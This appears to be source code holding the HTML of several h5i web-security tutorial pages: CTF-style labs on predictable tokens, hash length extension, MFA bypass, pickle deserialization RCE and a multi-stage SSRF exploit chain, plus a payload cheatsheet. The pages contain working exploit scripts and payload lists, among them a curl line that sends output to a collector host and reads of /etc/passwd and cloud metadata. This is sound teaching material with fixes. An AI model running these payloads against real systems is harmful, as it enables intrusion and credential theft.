+<p>This is not an input-validation bug. The JSON is valid and every coupon exists. The missing invariant is “a coupon may appear at most once.”</p>
+<p>When testing business logic, write the product rules in plain language and try sequences that violate each rule: duplicates, reordering, reuse after cancellation, negative quantities, and concurrent redemption.</p>
+<h2 id="lab-37-predict-a-recovery-token">Lab 37: predict a recovery token</h2>
+<p>Security tokens must be generated with a cryptographically secure random number generator. This lab uses Python’s Mersenne Twister seeded with the current Unix second.</p>
+<pre><code class="language-bash">$ ./run.sh 37
+$ h5i browser open 'http://127.0.0.1:9370/' \
+  --session lab37 --new --capture
+</code></pre>
+<p>Request a token for an address you control. The lab reveals it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab37 --create \
+  --set method=POST --set path=/api/recover \
+  --set header.Content-Type=application/json \
+  --set json.email=me@example.test
+</code></pre>
+<p>The reply contains <code>{"email": "me@example.test", "token": "..."}</code>. Put that token in a variable and search for the second that produced it. Do this immediately: the window is only a few seconds wide.</p>
+<pre><code class="language-bash">$ MINE='PASTE_YOUR_TOKEN'
+$ OFFSET=$(MINE=&quot;$MINE&quot; python3 - &lt;&lt;'SEED'
+import os
+import random
+import time
+
+observed = os.environ[&quot;MINE&quot;]
+now = int(time.time())
+
+for seed in range(now - 5, now + 6):
+    r = random.Random(seed)
+    candidate = &quot;%08x%08x&quot; % (r.getrandbits(32), r.getrandbits(32))
+    if candidate == observed:
+        print(seed - now)
+        break
+else:
+    print(&quot;nocal&quot;)
+SEED
+)
+
+$ printf '%s\n' &quot;$OFFSET&quot;
+0
+</code></pre>
+<p><code>OFFSET</code> is the difference between the server’s clock and ours. <code>nocal</code> means too much time passed between the two commands, so request a fresh token and try again.</p>
+<p>Now ask for the admin’s token, which we are not shown, and test the handful of values it could have been:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab37 --create \
+  --set method=POST --set path=/api/recover \
+  --set header.Content-Type=application/json \
+  --set json.email=admin@acme.test
+
+$ for T in $(OFFSET=&quot;$OFFSET&quot; python3 - &lt;&lt;'SEED'
+import os
+import random
+import time
+
+base = int(time.time()) + int(os.environ[&quot;OFFSET&quot;])
+
+for seed in range(base - 2, base + 3):
+    r = random.Random(seed)
+    print(&quot;%08x%08x&quot; % (r.getrandbits(32), r.getrandbits(32)))
+SEED
+); do
+    h5i websec replay req_0 --session lab37 --create --reset-budget \
+      --set path=/api/recover/use --set &quot;query.token=$T&quot;
+  done
+</code></pre>
+<p>Four of the five candidates answer <code>{"error": "unknown token"}</code>. The fifth returns <code>FLAG{predictable_token}</code>.</p>
+<p>The issue is not token length. Sixteen hexadecimal characters look substantial, but all possible outputs collapse to a few likely time seeds. Use a CSPRNG such as Python’s <code>secrets.token_urlsafe</code>, expire tokens quickly, bind them to one account and purpose, and invalidate them after use.</p>
+<h2 id="lab-38-hash-length-extension">Lab 38: hash length extension</h2>
+<p>The signer authenticates data using:</p>
+<pre><code class="language-text">SHA256(secret || data)
+</code></pre>
+<p>The secret is random and unknown. However, SHA-256’s Merkle–Damgård construction lets someone holding the digest resume hashing after the internal padding and append more data.</p>
+<p>Start the lab:</p>
+<pre><code class="language-bash">$ ./run.sh 38
+$ h5i browser open 'http://127.0.0.1:9380/' \
+  --session lab38 --new --capture
+</code></pre>
+<p>The homepage prints a sample signed request. Read it and copy the 64-character <code>sig</code>:</p>
+<pre><code class="language-bash">$ h5i websec show res_0 --session lab38 --raw
+</code></pre>
+<p>The repository includes <code>extend.py</code>, which performs the SHA-256 state continuation:</p>
+<pre><code class="language-bash">$ SIG='PASTE_SIGNATURE'
+$ read -r NEWDATA NEWSIG &lt;&lt;&lt;&quot;$(python3 labs/38-length-extension/extend.py \
+    --digest &quot;$SIG&quot; \
+    --data 'user=guest&amp;role=viewer' \
+    --append '&amp;role=admin' \
+    --key-len 16)&quot;
+</code></pre>
+<p>It prints forged percent-encoded data and a new signature. The data contains padding bytes, so send the request target without URL normalization:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab38 \
+  --raw-target &quot;/api/act?data=$NEWDATA&amp;sig=$NEWSIG&quot;
+</code></pre>
+<p>The application uses the last <code>role</code> value and returns <code>FLAG{length_extension}</code>.</p>
+<p>Use HMAC rather than inventing a MAC from <code>hash(secret || message)</code>. HMAC’s construction is specifically designed to avoid length-extension attacks. Also reject duplicate security-critical parameters.</p>
+<h2 id="lab-39-skip-the-second-authentication-state">Lab 39: skip the second authentication state</h2>
+<p>MFA is a flow, not merely a screen. After password verification, this lab issues a temporary token intended only for the second step. Other endpoints mistakenly accept it as a full session.</p>
+<pre><code class="language-bash">$ ./run.sh 39
+$ h5i browser open 'http://127.0.0.1:9390/' \
+  --session lab39 --new --capture
+</code></pre>
+<p>Log in with the known password:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab39 --create \
+  --set method=POST --set path=/api/login \
+  --set header.Content-Type=application/json \
+  --set json.user=dana \
+  --set json.password=correct-horse
+</code></pre>
+<p>Copy the returned token and call the vault without completing MFA:</p>
+<pre><code class="language-bash">$ TOKEN='PASTE_LOGIN_TOKEN'
+$ h5i websec replay req_0 --session lab39 --create \
+  --set path=/api/vault \
+  --set &quot;header.Authorization=Bearer $TOKEN&quot;
+</code></pre>
+<p>The response contains <code>FLAG{mfa_bypass}</code>.</p>
+<p>Represent authentication level explicitly. A pre-MFA token should have a narrow audience and should be accepted only by the verification endpoint. After the second factor succeeds, issue a distinct full-session token.</p>
+<h2 id="lab-40-a-signed-pickle-is-still-a-program">Lab 40: a signed pickle is still a program</h2>
+<p>The final lab stores preferences in a Python pickle inside a cookie. The cookie has a valid HMAC, but the signing key is the sample value printed on the homepage.</p>
+<pre><code class="language-bash">$ ./run.sh 40
+$ h5i browser open 'http://127.0.0.1:9400/' \
+  --session lab40 --new --capture
+</code></pre>
+<p>Python pickle is not a passive data format. Its reconstruction instructions can call functions. Create an object that runs <code>printenv FLAG</code>, then sign it with the exposed key:</p>
+<pre><code class="language-bash">$ COOKIE=$(python3 - &lt;&lt;'PY'
+import base64
+import hashlib
+import hmac
+import pickle
+import subprocess
+
+SECRET = b&quot;prefs-signing-key&quot;
+
+class Payload:
+    def __reduce__(self):
+        return (
+            subprocess.check_output,
+            ([&quot;printenv&quot;, &quot;FLAG&quot;],),
+        )
+
+raw = pickle.dumps(Payload())
+mac = hmac.new(SECRET, raw, hashlib.sha256).hexdigest()[:16]
+value = base64.urlsafe_b64encode(raw).decode().rstrip(&quot;=&quot;)
+print(value + &quot;.&quot; + mac)
+PY
+)
+</code></pre>
+<p>Send it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab40 --create \
+  --set path=/api/prefs \
+  --set &quot;cookie.prefs=$COOKIE&quot;
+</code></pre>
+<p>Deserialization executes the payload and returns <code>FLAG{pickle_cookie_rce}</code>.</p>
+<p>The signature answers only “Was this value created by someone holding the key?” Once the key is exposed, it authorizes arbitrary pickle programs. Never deserialize untrusted pickle data. Use a non-executable format such as JSON with a strict schema, even when the value is signed.</p>
+<h2 id="a-reusable-logic-testing-method">A reusable logic-testing method</h2>
+<p>Move beyond individual fields:</p>
+<ol>
+<li>Write down invariants such as “balance never goes below zero” or “MFA is complete before this token reaches the vault.”</li>
+<li>Test duplicates, reordering, retries, cancellation, and concurrent execution.</li>
+<li>Distinguish apparent entropy from unpredictable entropy.</li>
+<li>Review cryptographic constructions, not only algorithms.</li>
+<li>Ask what a serialized format can execute when decoded.</li>
+<li>Confirm the final business impact.</li>
+</ol>
+<h2 id="summary">Summary</h2>
+<p>These labs exploited missing rules across time and state: concurrent balance checks, duplicate coupons, time-seeded tokens, an unsafe MAC construction, a pre-MFA token accepted too broadly, and executable serialized data.</p>
+<pre><code class="language-bash">$ for s in lab35 lab36 lab37 lab38 lab39 lab40; do
+    h5i browser close --session &quot;$s&quot;
+  done
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/exploit-chains/">Building Exploit Chains</a>, we will combine earlier techniques into reproducible multi-step exploit chains.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/35-race-double-spend">Lab 35: Race condition</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/36-coupon-stacking">Lab 36: Coupon stacking</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/37-predictable-token">Lab 37: Predictable token</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/38-length-extension">Lab 38: Hash length extension</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/39-mfa-bypass">Lab 39: MFA bypass</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/40-pickle-cookie-rce">Lab 40: Insecure deserialization</a></li>
+</ul>""",
+}
+
+
+CHAINS = {
+    "section": "guides", "slug": "exploit-chains", "published": "2026-09-15",
+    "eyebrow": "Tutorial 10 / Chaining", "time": "7 min",
+    "tags": "Sequences &middot; Chaining &middot; Labs 41&ndash;42",
+    "title": "Building Exploit Chains | h5i web security tutorial",
+    "h1": "Building Exploit Chains",
+    "description": "The final h5i tutorial: carry fresh values between requests, turn small findings into a complete compromise, and keep the entire chain reproducible.",
+    "meta": "Carry fresh values between requests, turn small findings into a complete compromise, and keep the whole chain reproducible.",
+    "deck": "The final h5i tutorial: carry fresh values between requests, turn small findings into a complete compromise, and keep the entire chain reproducible.",
+    "next": ("/guides/cheatsheet/", "Keep it beside you", "Cheatsheet", "The loop, every --set target, the replay flags, and probe values by class, on one page."),
+    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
+    "body": r"""<p>The previous articles treated vulnerabilities one at a time. Real impact often appears only when several ordinary weaknesses connect.</p>
+<p>Labs 41 and 42 conclude <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> with two kinds of chain:</p>
+<ul>
+<li>an automated workflow where one response supplies a fresh token to the next request; and</li>
+<li>a five-stage exploit where every finding reveals the capability needed for the following step.</li>
+</ul>
+<p>The governing question is:</p>
+<blockquote>
+<p>What does this result let me reach that I could not reach before?</p>
+</blockquote>
+<p>These are deliberately vulnerable local labs. Only test systems where you have explicit authorization.</p>
+<h2 id="why-a-single-replay-is-sometimes-insufficient">Why a single replay is sometimes insufficient</h2>
+<p><code>h5i websec replay</code> is ideal when a stored request needs one controlled change. Some endpoints, however, require a value generated moments earlier:</p>
+<ol>
+<li>log in;</li>
+<li>render a form;</li>
+<li>extract its fresh CSRF token;</li>
+<li>submit the form with that token; and</li>
+<li>request the result.</li>
+</ol>
+<p>Copying values manually works once, but it is fragile and hard to reproduce. <code>h5i websec sequence</code> describes the steps, extracts values, and binds them into later requests.</p>
+<h2 id="lab-41-mass-assignment-behind-a-valid-csrf-token">Lab 41: mass assignment behind a valid CSRF token</h2>
+<p>Start the settings lab:</p>
+<pre><code class="language-bash">$ ./run.sh 41
+$ h5i browser open 'http://127.0.0.1:9410/' \
+  --session lab41 --new --capture
+</code></pre>
+<p>The settings form uses a fresh, single-use CSRF token. The protection works. The bug is that the update handler still accepts a <code>role</code> field that the form never displays.</p>
+<p>A replay of an old submission will fail because its token is missing or expired. Create <code>flow.json</code>:</p>
+<pre><code class="language-json">{
+  &quot;steps&quot;: [
+    {
+      &quot;name&quot;: &quot;log in&quot;,
+      &quot;resend&quot;: 0,
+      &quot;create&quot;: true,
+      &quot;set&quot;: [
+        &quot;method=POST&quot;,
+        &quot;path=/api/login&quot;,
+        &quot;header.Content-Type=application/json&quot;,
+        &quot;json.user=${user}&quot;,
+        &quot;json.password=${password}&quot;
+      ]
+    },
+    {
+      &quot;name&quot;: &quot;render the form and take its token&quot;,
+      &quot;resend&quot;: 0,
+      &quot;create&quot;: true,
+      &quot;set&quot;: [
+        &quot;method=GET&quot;,
+        &quot;path=/account/settings&quot;
+      ],
+      &quot;extract&quot;: {
+        &quot;csrf&quot;: &quot;regex:name=\&quot;csrf\&quot; value=\&quot;([^\&quot;]+)\&quot;&quot;
+      }
+    },
+    {
+      &quot;name&quot;: &quot;save an extra field&quot;,
+      &quot;resend&quot;: 0,
+      &quot;create&quot;: true,
+      &quot;set&quot;: [
+        &quot;method=POST&quot;,
+        &quot;path=/account/settings&quot;,
+        &quot;header.Content-Type=application/x-www-form-urlencoded&quot;,
+        &quot;form.display_name=Guest&quot;,
+        &quot;form.csrf=${csrf}&quot;,
+        &quot;form.role=admin&quot;
+      ]
+    },
+    {
+      &quot;name&quot;: &quot;collect&quot;,
+      &quot;resend&quot;: 0,
+      &quot;create&quot;: true,
+      &quot;set&quot;: [
+        &quot;method=GET&quot;,
+        &quot;path=/admin/flag&quot;
+      ],
+      &quot;extract&quot;: {
+        &quot;flag&quot;: &quot;regex:(FLAG\\{[^}]+\\})&quot;
+      }
+    }
+  ]
+}
+</code></pre>
+<p>Run it with the lab credentials:</p>
+<pre><code class="language-bash">$ h5i websec sequence flow.json \
+  --session lab41 \
+  --var user=guest \
+  --var password=guest
+</code></pre>
+<p>The second step extracts <code>csrf</code>. <code>${csrf}</code> in the third step is substituted with that exact value. An unbound variable stops the sequence rather than silently becoming an empty string.</p>
+<p>The final step binds:</p>
+<pre><code class="language-text">FLAG{sequence_csrf_chain}
+</code></pre>
+<p>The sequence does not bypass CSRF. It satisfies the control correctly and then tests a different property: whether the authenticated user may assign <code>role</code>.</p>
+<p>The fix is the same as in <a href="/guides/broken-access-control/">Broken Access Control</a>: allowlist editable fields and keep authorization data outside the object bound from the request.</p>
+<h2 id="sequence-files-as-security-artifacts">Sequence files as security artifacts</h2>
+<p>A useful proof of concept should do more than work on its author’s machine. A sequence records:</p>
+<ul>
+<li>which request each step resends;</li>
+<li>which fields change;</li>
+<li>which values are extracted;</li>
+<li>where those values are used; and</li>
+<li>where the final evidence appears.</li>
+</ul>
+<p>That makes it suitable for retesting and CI. After a fix, the same sequence should fail at the intended step.</p>
+<p>Useful extractors include regular expressions, JSON paths, response headers, and status codes. Cookies need no manual binding because the browser session’s cookie jar carries them between steps.</p>
+<h2 id="lab-42-the-final-gauntlet">Lab 42: the final gauntlet</h2>
+<p>Lab 42 contains no new vulnerability class. It tests whether we can connect the techniques already learned.</p>
+<pre><code class="language-bash">$ ./run.sh 42
+$ h5i browser open 'http://127.0.0.1:9420/robots.txt' \
+  --session lab42 --new --capture
+$ h5i websec sitemap --session lab42 --human
+</code></pre>
+<p>Keep every probe inside this session. The request history will become the reproduction.</p>
+<h3 id="step-1-recon-reveals-the-map">Step 1: recon reveals the map</h3>
+<p><code>robots.txt</code> names <code>/internal/</code>. Request its handover note:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab42 \
+  --set path=/internal/handover.md
+</code></pre>
+<p>The note reveals four facts:</p>
+<ul>
+<li>an older signup implementation still exists;</li>
+<li>it is selected through <code>X-Api-Version: 0</code>;</li>
+<li>a <code>support</code> account can use <code>/api/support/fetch</code>;</li>
+<li>an internal ops service runs on port 9421 and still exposes <code>/debug/env</code>.</li>
+</ul>
+<p>The note is not the final vulnerability. It tells us where the chain can go.</p>
+<h3 id="step-2-deprecated-behavior-enables-mass-assignment">Step 2: deprecated behavior enables mass assignment</h3>
+<p>The visible route is <code>/api/v1/signup</code>, but a client-controlled header selects the older behavior. Ask it to create a support user:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab42 --create \
+  --set method=POST \
+  --set path=/api/v1/signup \
+  --set header.Content-Type=application/json \
+  --set header.X-Api-Version=0 \
+  --set json.user=climber \
+  --set json.role=support
+</code></pre>
+<p>The deprecated handler accepts <code>role</code> and returns a token. Copy it:</p>
+<pre><code class="language-bash">$ TOKEN='PASTE_SUPPORT_TOKEN'
+</code></pre>
+<p>We combined the recon lesson from Lab 5 with mass assignment from Lab 9. Version skew does not always appear in the URL; it may be controlled through a header, media type, or query parameter.</p>
+<h3 id="step-3-support-access-unlocks-ssrf">Step 3: support access unlocks SSRF</h3>
+<p>The support token grants access to a URL fetcher. The application blocks familiar loopback spellings, but not the integer form <code>2130706433</code>:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab42 --create \
+  --reset-budget \
+  --set path=/api/support/fetch \
+  --set &quot;header.Authorization=Bearer $TOKEN&quot; \
+  --set query.url=http://2130706433:9421/debug/env
+</code></pre>
+<p>This is the SSRF filter bypass from Labs 25 and 26. The fetcher wraps what it received, so the ops service’s own JSON arrives as a string inside the <code>body</code> field:</p>
+<pre><code class="language-json">{
+  &quot;status&quot;: 200,
+  &quot;body&quot;: &quot;{\&quot;NODE_ENV\&quot;: \&quot;production\&quot;, \&quot;OPS_TOKEN\&quot;: \&quot;ops_...\&quot;, \&quot;REGION\&quot;: \&quot;eu-west-1\&quot;}&quot;
+}
+</code></pre>
+<p>Copy the <code>OPS_TOKEN</code> value:</p>
+<pre><code class="language-bash">$ OPS='PASTE_OPS_TOKEN'
+</code></pre>
+<h3 id="step-4-use-the-internal-secret">Step 4: use the internal secret</h3>
+<p>The final vault is reachable only through the internal service and requires the ops token:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab42 --create \
+  --reset-budget \
+  --set path=/api/support/fetch \
+  --set &quot;header.Authorization=Bearer $TOKEN&quot; \
+  --set &quot;query.url=http://2130706433:9421/vault?token=$OPS&quot;
+</code></pre>
+<p>The result contains:</p>
+<pre><code class="language-text">FLAG{the_gauntlet}
+</code></pre>
+<p>The whole route was:</p>
+<pre><code class="language-text">public robots.txt
+  → internal handover note
+  → deprecated signup behavior
+  → support-role mass assignment
+  → authenticated URL fetcher
+  → SSRF filter bypass
+  → internal debug environment
+  → ops token
+  → root credential
+</code></pre>
+<h2 id="why-the-chain-matters">Why the chain matters</h2>
+<p>Consider the components separately:</p>
+<ul>
+<li>a public internal note may look informational;</li>
+<li>deprecated signup behavior may appear low impact;</li>
+<li>a support-only fetcher may seem appropriately restricted;</li>
+<li>an internal debug endpoint may be considered unreachable.</li>
+</ul>
+<p>Together, an unauthenticated visitor obtains the root credential.</p>
+<p>A report should state that end-to-end impact first, then explain each link. Individual severity scores describe components; the chain describes actual risk.</p>
+<h2 id="fixing-a-chain">Fixing a chain</h2>
+<p>Defense in depth means any correctly repaired boundary can stop the full path:</p>
+<ul>
+<li>do not publish internal operational notes;</li>
+<li>delete deprecated handlers instead of merely hiding them;</li>
+<li>allowlist signup fields across every version;</li>
+<li>resolve and validate SSRF destinations against network policy;</li>
+<li>prevent the application from reaching unnecessary internal ports;</li>
+<li>remove production debug endpoints;</li>
+<li>keep secrets out of debug output and query strings.</li>
+</ul>
+<p>The existence of several fixes is good news. It also means a partial fix should be retested with the same sequence to identify whether another route still completes the chain.</p>
+<h2 id="the-method-to-keep">The method to keep</h2>
+<p>Across all 42 labs, the recurring loop was:</p>
+<ol>
+<li><strong>Capture</strong> a legitimate request.</li>
+<li><strong>Read</strong> the complete response and traffic record.</li>
+<li><strong>Change one thing</strong> through replay.</li>
+<li><strong>Compare</strong> status, size, time, headers, and body.</li>
+<li><strong>Ask what the result unlocks.</strong></li>
+<li><strong>Keep the next step in the same session.</strong></li>
+<li><strong>Turn the final path into a reproducible sequence.</strong></li>
+</ol>
+<p>h5i supplies the browser, direct HTTP control, and audit trail. The security reasoning remains the tester’s job: understand the application’s actors, objects, trust boundaries, and invariants.</p>
+<h2 id="summary">Summary</h2>
+<p>Lab 41 automated a dynamic four-request flow without weakening its CSRF protection. Lab 42 chained recon, deprecated behavior, mass assignment, SSRF, and leaked internal credentials into a root compromise.</p>
+<pre><code class="language-bash">$ h5i browser close --session lab41
+$ h5i browser close --session lab42
+$ ./run.sh stop
+</code></pre>
+<p>The complete exercises, vulnerable applications, proof-of-concept scripts, and detailed solutions are available in <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a>.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/41-sequence-csrf-chain">Lab 41: Sequence and CSRF chain</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/42-the-gauntlet">Lab 42: The Gauntlet</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-benchmark">h5i-benchmark</a></li>
+</ul>""",
+}
+
+
+CHEATSHEET = {
+    "section": "guides", "slug": "cheatsheet", "published": "2026-09-15",
+    "eyebrow": "Reference / websec", "time": "5 min",
+    "tags": "Cheatsheet &middot; websec &middot; Reference",
+    "title": "h5i websec cheatsheet | h5i",
+    "h1": "Cheatsheet",
+    "description": "One page of h5i websec reference: the capture and replay loop, every --set target, the replay flags, probe values by vulnerability class, and how to read a sweep.",
+    "meta": "One page of h5i websec reference: the capture and replay loop, every --set target, the replay flags, and probe values by class.",
+    "deck": "One page. Print it, or keep it open beside the labs.",
+    "faq": [
+        ("How is a --set value parsed?", "The value is everything after the first =, so a payload full of = needs no escaping. A value that parses as JSON is sent as JSON, so json.admin=true is a boolean and json.admin=\"true\" is the string."),
+        ("Which flag do loops forget?", "--reset-budget. Each page has a bounded network allowance, and without it a long loop stops partway while every later probe reads as a negative result."),
+    ],
+    "next": ("/guides/authorized-web-security-testing/", "Put it to work", "Run an authorized web security test with an AI agent", "Scope a session to a target you may test, then capture, enumerate, replay, and report."),
+    "cta": ("The full command reference", "Every flag on this page, with its exit codes and limits.", "/manual/#h5i-websec", "Open the manual"),
+    "body": r"""<div class="callout"><strong>The reference card for the h5i web security tutorial.</strong>
+The labs it refers to are 42 deliberately vulnerable applications you run on your own machine,
+in <a href="https://github.com/h5i-dev/h5i-tutorial">h5i-dev/h5i-tutorial</a>.
+Use h5i only against systems you own or are explicitly authorized to test.</div>
+<h2 id="the-loop">The loop</h2>
+<pre><code class="language-bash">h5i browser open URL --session s --new --capture     # 1. capture
+h5i websec requests --session s --human              # 2. read the record
+h5i websec show res_0 --session s --raw              #    read one message
+h5i websec replay req_0 --session s --set TARGET=V   # 3. change one thing
+h5i websec diff res_0 res_1 --session s --human      # 4. compare
+h5i websec match res_1 --session s --contains X      #    assert (exit 0/1/2)
+h5i browser close --session s
+</code></pre>
+<p>Body of a replay's answer, in two calls:</p>
+<pre><code class="language-bash">SEQ=$(h5i websec replay req_0 --session s --set … | jq -r .seq)
+h5i websec show &quot;res_$SEQ&quot; --session s --raw
+</code></pre>
+<hr />
+<h2 id="-set-targets"><code>--set</code> targets</h2>
+<pre><code>method=POST                       url=http://other/x        path=/admin
+query.&lt;name&gt;=                     header.&lt;name&gt;=            cookie.&lt;name&gt;=
+json.&lt;a.b.0.c&gt;=                   form.&lt;name&gt;=              body.raw=
+multipart.&lt;part&gt;=                 multipart.&lt;part&gt;.filename=
+multipart.&lt;part&gt;.content-type=
+</code></pre>
+<ul>
+<li>value = everything after the <strong>first</strong> <code>=</code></li>
+<li>a value that parses as JSON is sent as JSON: <code>json.admin=true</code> (boolean),
+  <code>json.p={"$gt":""}</code> (object), <code>json.t=["a"]</code> (array), <code>json.admin="true"</code> (string)</li>
+<li><code>--create</code> to add, <code>--unset</code> to remove, <code>--set-file T=PATH</code> for bytes</li>
+</ul>
+<h2 id="replay-flags">Replay flags</h2>
+<pre><code>--create           add a target that is not there
+--set-file T=PATH  the value is the file's bytes (images, polyglots)
+--as SESSION       send from another session's jar        [Lab 08]
+--keep-credentials carry Cookie/Authorization with --as
+--repeat N         N sends, with median + MAD timing      [Lab 14]
+--race             release the repeats together           [Lab 35]
+--no-follow        stop at the redirect and report it     [Lab 24]
+--reset-budget     restart the page allowance — USE IN LOOPS [Lab 06]
+--raw-target T     request-target byte for byte           [Lab 27]
+--raw-request F    whole message byte for byte            [Lab 30]
+</code></pre>
+<h2 id="other-verbs">Other verbs</h2>
+<pre><code>h5i websec requests --method/--status/--url-contains/--initiator/--denied-only/--limit
+h5i websec show ID --raw | --body-to PATH
+h5i websec sitemap
+h5i websec match ID --status/--contains/--regex/--json-path/--header/--longer-than/--shorter-than
+h5i websec sequence FILE --var N=V [--keep-going]         [Lab 41]
+h5i websec socket ws://… --send FRAME --wait-ms MS        [Lab 34]
+h5i browser requests            # includes what policy DENIED
+h5i browser snapshot | markdown | click @e3 | type @e5 &quot;x&quot; | navigate URL
+</code></pre>
+<hr />
+<h2 id="probe-values-by-class">Probe values, by class</h2>
+<p><strong>Injection canaries</strong> (send once per parameter; watch status, size, time):</p>
+<pre><code>'    &quot;    \    `    ;    |    &amp;    &lt;    &gt;    ${7*7}    {{7*7}}    ../    %00
+</code></pre>
+<p><strong>SQL</strong> — [Labs 12–14, 19]</p>
+<pre><code>'                          break it
+' AND '1'='1  /  '1'='2    prove the logic changed
+' ORDER BY 3 --            count columns
+' UNION SELECT 1,2,3 --    read
+' AND (SELECT unicode(substr(x,1,1)) FROM t) &gt; 77 --      boolean oracle
+' OR (SELECT CASE WHEN (…) THEN sleep(1) ELSE 0 END) --   timing oracle
+schema: sqlite_master | information_schema.tables | pg_tables | sys.tables
+comment: `-- ` (with the space) | # | /**/
+</code></pre>
+<p><strong>NoSQL / type confusion</strong> — [Labs 09, 15]</p>
+<pre><code>{&quot;$gt&quot;: &quot;&quot;}   {&quot;$ne&quot;: null}   {&quot;$regex&quot;: &quot;^a&quot;}   {&quot;$in&quot;: [...]}
+?p[$ne]=1      ?a[]=x&amp;a[]=y      true vs &quot;true&quot;      1 vs &quot;1&quot;
+</code></pre>
+<p><strong>Command</strong> — [Labs 16, 34]</p>
+<pre><code>; id      | id      &amp;&amp; id      $(id)      `id`      %0a id
+${IFS} for spaces      {cat,/etc/passwd}      c''at
+close the quote first:  x'; id; echo '
+blind: ; sleep 5;   |   ; curl http://collector/$(whoami);
+</code></pre>
+<p><strong>Template (SSTI)</strong> — [Labs 17, 29]</p>
+<pre><code>{{7*7}}  {{7*'7'}}  ${7*7}  #{7*7}  &lt;%= 7*7 %&gt;
+python: obj.__init__.__globals__[&quot;SECRET&quot;]
+        ''.__class__.__mro__[1].__subclasses__()
+jinja:  {{ cycler.__init__.__globals__.os.popen('id').read() }}  {{ config }}
+</code></pre>
+<p><strong>Traversal / LFI</strong> — [Labs 27, 29]</p>
+<pre><code>../  ..%2f  %2e%2e%2f  %252e%252e%252f  ..%c0%af  ....//
+targets: /etc/passwd  /proc/self/environ  /proc/self/cmdline  access.log  .env
+--raw-target when the encoding IS the payload
+</code></pre>
+<p><strong>XXE</strong> — [Lab 18]</p>
+<pre><code class="language-xml">&lt;!DOCTYPE r [ &lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;
+blind: parameter entity + external DTD on your host
+</code></pre>
+<p><strong>SSRF</strong> — [Labs 25, 26]</p>
+<pre><code>127.0.0.1 → 2130706433 | 0x7f000001 | 017700000001 | 127.1 | 0 | [::1]
+169.254.169.254/latest/meta-data/iam/security-credentials/
+metadata.google.internal/computeMetadata/v1/  (+ Metadata-Flavor: Google)
+also: file:// gopher:// dict://, a redirect you control, DNS rebinding
+</code></pre>
+<p><strong>JWT</strong> — [Labs 10, 11]</p>
+<pre><code>alg: none (trailing dot)   |  crack a weak HS256 secret
+RS256→HS256 (public key as the HMAC key)
+kid: ../static/known.txt   |  jku/x5u pointing at your JWKS
+missing exp / iss / aud checks
+</code></pre>
+<p><strong>Serialisation</strong> — [Lab 40]</p>
+<pre><code>\x80\x04  pickle      rO0AB / \xac\xed  Java      O:8:&quot;  a:2:{  PHP
+AAEAAAD/////  .NET      !!python/object/apply:  YAML   {&quot;$type&quot;:  Json.NET
+</code></pre>
+<p><strong>Origin / redirect validation</strong> — [Labs 23, 24]</p>
+<pre><code>https://ok.example.evil.test        prefix check
+https://evilok.example              suffix check
+https://evil.test/?x=ok.example     substring check
+https://ok.example@evil.test        userinfo
+//evil.test    http://ok.example:9999    Origin: null
+an open redirect ON the allowed origin
+</code></pre>
+<p><strong>Headers worth sweeping</strong> — [Labs 23, 29, 32, 33]</p>
+<pre><code>Host  X-Forwarded-Host  X-Forwarded-For  X-Forwarded-Proto  X-Original-URL
+X-Rewrite-URL  Origin  Referer  User-Agent  True-Client-IP  Via  X-Api-Version
+</code></pre>
+<p><strong>Mass-assignment field names</strong> — [Lab 09]</p>
+<pre><code>is_admin isAdmin admin role roles is_staff is_superuser verified confirmed
+active enabled credits balance quota plan tier owner_id user_id tenant_id
+organization_id id uuid password_hash mfa_enabled
+</code></pre>
+<p><strong>CRLF</strong> — [Lab 31] carry real bytes: <code>$'\r\n'</code> in a JSON field, or
+<code>--raw-target</code> / <code>--raw-request</code>. End the header block (<code>\r\n\r\n</code>) rather
+than fighting duplicate-header precedence.</p>
+<hr />
+<h2 id="the-four-questions-for-any-endpoint">The four questions for any endpoint</h2>
+<ol>
+<li><strong>Who</strong> — replay it as every other actor (<code>--as</code>, no credential at all)</li>
+<li><strong>What</strong> — change every identifier, and every field's <em>type</em></li>
+<li><strong>How</strong> — change the method, the <code>Content-Type</code>, the path's spelling, the API version</li>
+<li><strong>When</strong> — send it twice, send it out of order, send twenty at once (<code>--race</code>)</li>
+</ol>
+<hr />
+<h2 id="reading-a-sweep">Reading a sweep</h2>
+<pre><code class="language-bash">for v in …; do
+  h5i websec replay req_0 --session s --reset-budget --set query.x=&quot;$v&quot; |
+    python3 -c 'import json,sys;r=json.load(sys.stdin);s=r[&quot;response&quot;]
+print(s[&quot;status&quot;], s[&quot;bytes&quot;], r[&quot;samples&quot;][0][&quot;total_ms&quot;])'
+done | sort | uniq -c
